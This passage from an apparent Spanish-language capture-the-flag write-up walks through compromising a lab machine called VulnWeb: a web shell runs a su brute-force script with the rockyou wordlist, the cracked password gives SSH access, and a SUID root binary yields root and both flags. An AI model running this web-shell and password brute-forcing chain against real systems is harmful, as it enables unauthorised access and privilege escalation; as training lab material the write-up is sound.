Así pues ya tenemos los archivos:
- **`shell.php`** : WebShell desde donde ejecutaremos el archivo `su.sh`.
- **`su.sh`** : Archivo bash de [Sudo_Bruteforce](https://github.com/j0rd1s3rr4n0/Sudo_BruteForce)(También se puede usar el binario)
- **`rockyou.txt`** : WordList que se usará para el ataque de diccionario al usuario `armando`.

Vamos a proceder a ejecutar el archivo
```java
www-data@861ac52240d6:…/html/uploads# bash su.sh

Uso: su.sh USUARIO DICCIONARIO
Se deben especificar tanto el nombre de usuario como el archivo de diccionario.

www-data@861ac52240d6:…/html/uploads# bash su.sh armando rockyou.txt >> result.txt 2> errors.txt
```
Ahora podemos ir observando si el archivo result.txt contiene la cadena `"encontrada para el usuario"` 

```java
www-data@b832447fdf7a:…/html/uploads# bash su.sh armando rockyou.txt

***********************************************
*                                             *
*          ██████╗ ██████╗ ██╗   ██╗          *
*         ██╔════╝██╔═══██╗██║   ██║          *
*         ██║     ██║   ██║██║   ██║          *
*         ██║     ██║   ██║╚██████╔╝          *
*         ╚═╝     ╚═╝   ╚═╝ ╚═════╝           *
*                                             *
*       Bienvenido a BruteForce SU            *
*       ¡Hackea con responsabilidad!          *
***********************************************

Probando contraseña [Línea 1]: 123456
Probando contraseña [Línea 2]: 12345
Probando contraseña [Línea 3]: 123456789
Probando contraseña [Línea 4]: password
Probando contraseña [Línea 5]: iloveyou
Probando contraseña [Línea 6]: princess
Probando contraseña [Línea 7]: 1234567
Probando contraseña [Línea 8]: rockyou
Probando contraseña [Línea 9]: 12345678
Probando contraseña [Línea 10]: abc123
Probando contraseña [Línea 11]: nicole
Probando contraseña [Línea 12]: daniel
Probando contraseña [Línea 13]: babygirl
Probando contraseña [Línea 14]: monkey
Probando contraseña [Línea 15]: lovely


[...]

Probando contraseña [Línea 8573]: love you
Probando contraseña [Línea 8574]: lavalamp
Probando contraseña [Línea 8575]: kobe08
Probando contraseña [Línea 8576]: kalani
Probando contraseña [Línea 8577]: john12
Probando contraseña [Línea 8578]: jesus3
Probando contraseña [Línea 8579]: jeanie
Probando contraseña [Línea 8580]: jade123
Probando contraseña [Línea 8581]: iluvu1
Probando contraseña [Línea 8582]: iluvboys
Probando contraseña [Línea 8583]: iloveme123
Probando contraseña [Línea 8584]: filomena
Probando contraseña [Línea 8585]: feliz
Probando contraseña [Línea 8586]: darklord
Probando contraseña [Línea 8587]: cute123
Probando contraseña [Línea 8588]: columbia

Contraseña encontrada para el usuario armando en la línea 8588: columbia
```

*Contraseña* encontrada para el *usuario* **armando** en la **línea 8588**: **columbia**


Establecemos una conexión **ssh** con el usuario `armando` y la contraseña `columbia` :
```java
┌─[j0rd1s3rr4n0@parrot]─[~]
└──╼ $ssh armando@172.17.0.2 -p 22
armando@172.17.0.2's password: 

Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.10.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Jan 26 05:02:53 2025 from 172.17.0.1

armando@861ac52240d6:~$ whoami;ls -la;pwd
armando
total 36
drwxr-x--- 1 armando armando   150 Jan 26 10:42 .
drwxr-xr-x 1 root    root       44 Dec 30 02:47 ..
-rw------- 1 armando armando    18 Jan 26 10:42 .bash_history
-rw-r--r-- 1 armando armando   220 Dec 30 02:47 .bash_logout
-rw-r--r-- 1 armando armando  3771 Dec 30 02:47 .bashrc
drwx------ 1 armando armando    40 Jan 26 05:02 .cache
drwx------ 1 armando armando    12 Jan 26 05:04 .config
-rw-r--r-- 1 armando armando   807 Dec 30 02:47 .profile
---s--x--x 1 root    root    16088 Dec 30 02:47 do_not_execute
-rw-r--r-- 1 root    root       39 Dec 30 02:47 user.txt
/home/armando

armando@861ac52240d6:~$ cat user.txt
flag{293aea10df6464942b3cce268c9c75af}
```
Al acceder al sistema podemos obervar que estamos en el home del usuario armando y que este home tiene 2 archivos que normalmente no se encuentran ahí, el user.txt que contiene la flag y un archivo con permiso SUID del usuario root.

```java
armando@861ac52240d6:~$ cat do_not_execute 
cat: do_not_execute: Permission denied
```
Este archivo no se puede leer, solo ejecutar. así que lo ejecutamos y...
```java
armando@861ac52240d6:~$ ./do_not_execute 
Ejecutando con privilegios de SUID.

root@861ac52240d6:~# whoami;cd /root;ls -la
root
total 20
drwx------ 1 root root  114 Dec 30 02:51 .
drwxr-xr-x 1 root root  256 Jan 26 02:39 ..
-rw-r--r-- 1 root root   49 Dec 30 02:47 .back_credentials
-rw------- 1 root root   67 Dec 30 02:51 .bash_history
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 1 root root    0 Dec 13 00:23 .ssh
-rw-r--r-- 1 root root   39 Dec 30 02:47 root.txt

root@861ac52240d6:/root# cat root.txt 
flag{570dd991217570f3a8dc417d00372183}
```
Hemos pasado del usuario `armando` al usuario `root`, ahora podemos leer el archivo `/root/root.txt` que contiene finalmente la flag que buscabamos.
Ahora podemos proceder a mandar las flags de los dos usuarios de la máquina VulnWeb.

![[Pasted image 20250126105548.png]]
